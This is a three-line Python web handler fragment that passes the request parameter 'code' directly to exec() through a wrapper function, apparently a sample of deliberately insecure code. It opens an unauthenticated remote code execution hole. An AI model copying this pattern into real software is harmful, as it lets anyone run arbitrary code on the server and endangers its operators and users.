def meta_exec(cmd):
    exec(cmd)
def handle(): meta_exec(request.args['code'])
